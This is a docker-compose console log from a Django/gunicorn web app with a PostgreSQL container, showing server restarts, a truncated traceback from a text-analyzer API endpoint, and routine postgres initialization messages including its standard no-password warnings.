Attaching to cohvis_nginx_1, cohvis_web_1, cohvis_postgres_1
[33mweb_1       |[0m [2017-04-05 10:04:26 +0000] [1] [INFO] Starting gunicorn 19.3.0
[33mweb_1       |[0m [2017-04-05 10:04:26 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
[33mweb_1       |[0m [2017-04-05 10:04:26 +0000] [1] [INFO] Using worker: sync
[33mweb_1       |[0m [2017-04-05 10:04:26 +0000] [8] [INFO] Booting worker with pid: 8
[33mweb_1       |[0m [2017-04-05 10:04:26 +0000] [10] [INFO] Booting worker with pid: 10
[33mweb_1       |[0m [2017-04-05 10:09:42 +0000] [1] [INFO] Handling signal: term
[33mweb_1       |[0m [2017-04-05 12:09:42 +0000] [8] [INFO] Worker exiting (pid: 8)
[33mweb_1       |[0m [2017-04-05 12:09:42 +0000] [10] [INFO] Worker exiting (pid: 10)
[33mweb_1       |[0m [2017-04-05 10:09:42 +0000] [1] [INFO] Shutting down: Master
[33mweb_1       |[0m [2017-04-05 10:09:49 +0000] [1] [INFO] Starting gunicorn 19.3.0
[33mweb_1       |[0m [2017-04-05 10:09:49 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
[33mweb_1       |[0m [2017-04-05 10:09:49 +0000] [1] [INFO] Using worker: sync
[33mweb_1       |[0m [2017-04-05 10:09:49 +0000] [8] [INFO] Booting worker with pid: 8
[33mweb_1       |[0m [2017-04-05 10:09:49 +0000] [10] [INFO] Booting worker with pid: 10
[33mweb_1       |[0m Internal Server Error: /apis/textanalyzer/
[33mweb_1       |[0m Traceback (most recent call last):
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/exception.py", line 39, in inner
[33mweb_1       |[0m     response = get_response(request)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py", line 249, in _legacy_get_response
[33mweb_1       |[0m     response = self._get_response(request)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py", line 187, in _get_response
[33mweb_1       |[0m     response = self.process_exception_by_middleware(e, request)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py", line 185, in _get_response
[33mweb_1       |[0m     response = wrapped_callback(request, *callback_args, **callback_kwargs)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/views/decorators/csrf.py", line 58, in wrapped_view
[33mweb_1       |[0m     return view_func(*args, **kwargs)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/django/views/generic/base.py", line 68, in view
[33mweb_1       |[0m     return self.dispatch(request, *args, **kwargs)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/rest_framework/views.py", line 483, in dispatch
[33mweb_1       |[0m     response = self.handle_exception(exc)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/rest_framework/views.py", line 443, in handle_exception
[33mweb_1       |[0m     self.raise_uncaught_exception(exc)
[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/rest_framework/views.py", line 480, in dispatch
[33mweb_1       |[0m     response = handler(request, *args, **kwargs)
[33mweb_1       |[0m   File "/code/cohapp/apis.py", line 470, in post
[33mweb_1       |[0m     analyzer = analyzeTextCohesion(text)
[33mweb_1       |[0m   File "/code/cohapp/coherenceanalyzer/coherenceanalyzer.py", line 606, in analyzeTextCohesion
[33mweb_1       |[0m     f = open(constants.temp_text, 'w')
[32mpostgres_1  |[0m The files belonging to this database system will be owned by user "postgres".
[32mpostgres_1  |[0m This user must also own the server process.
[32mpostgres_1  |[0m 
[32mpostgres_1  |[0m The database cluster will be initialized with locale "en_US.utf8".
[32mpostgres_1  |[0m The default database encoding has accordingly been set to "UTF8".
[32mpostgres_1  |[0m The default text search configuration will be set to "english".
[32mpostgres_1  |[0m 
[32mpostgres_1  |[0m Data page checksums are disabled.
[32mpostgres_1  |[0m 
[32mpostgres_1  |[0m fixing permissions on existing directory /var/lib/postgresql/data ... ok
[32mpostgres_1  |[0m creating subdirectories ... ok
[32mpostgres_1  |[0m selecting default max_connections ... 100
[32mpostgres_1  |[0m selecting default shared_buffers ... 128MB
[32mpostgres_1  |[0m selecting dynamic shared memory implementation ... posix
[32mpostgres_1  |[0m creating configuration files ... ok
[32mpostgres_1  |[0m running bootstrap script ... ok
[32mpostgres_1  |[0m performing post-bootstrap initialization ... ok
[32mpostgres_1  |[0m 
[32mpostgres_1  |[0m WARNING: enabling "trust" authentication for local connections
[32mpostgres_1  |[0m You can change this by editing pg_hba.conf or using the option -A, or
[32mpostgres_1  |[0m --auth-local and --auth-host, the next time you run initdb.
[32mpostgres_1  |[0m syncing data to disk ... ok
[32mpostgres_1  |[0m 
[32mpostgres_1  |[0m Success. You can now start the database server using:
[32mpostgres_1  |[0m 
[32mpostgres_1  |[0m     pg_ctl -D /var/lib/postgresql/data -l logfile start
[32mpostgres_1  |[0m 
[32mpostgres_1  |[0m ****************************************************
[32mpostgres_1  |[0m WARNING: No password has been set for the database.
[32mpostgres_1  |[0m          This will allow anyone with access to the
[32mpostgres_1  |[0m          Postgres port to access your database. In
[32mpostgres_1  |[0m          Docker's default configuration, this is
[32mpostgres_1  |[0m          effectively any other container on the same
[32mpostgres_1  |[0m          system.
[32mpostgres_1  |[0m 
[32mpostgres_1  |[0m          Use "-e POSTGRES_PASSWORD=password" to set
[32mpostgres_1  |[0m          it in "docker run".
[32mpostgres_1  |[0m ****************************************************
[32mpostgres_1  |[0m waiting for server to start....LOG:  database system was shut down at 2017-04-05 07:51:37 UTC
[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
[32mpostgres_1  |[0m LOG:  autovacuum launcher started
[32mpostgres_1  |[0m  done
[32mpostgres_1  |[0m server started
[32mpostgres_1  |[0m ALTER ROLE
[32mpostgres_1  |[0m 
[32mpostgres_1  |[0m 
[32mpostgres_1  |[0m /usr/local/bin/docker-entrypoint.sh: ignoring /docker-entrypoint-initdb.d/*
[32mpostgres_1  |[0m 
[32mpostgres_1  |[0m LOG:  received fast shutdown request
[32mpostgres_1  |[0m LOG:  aborting any active transactions
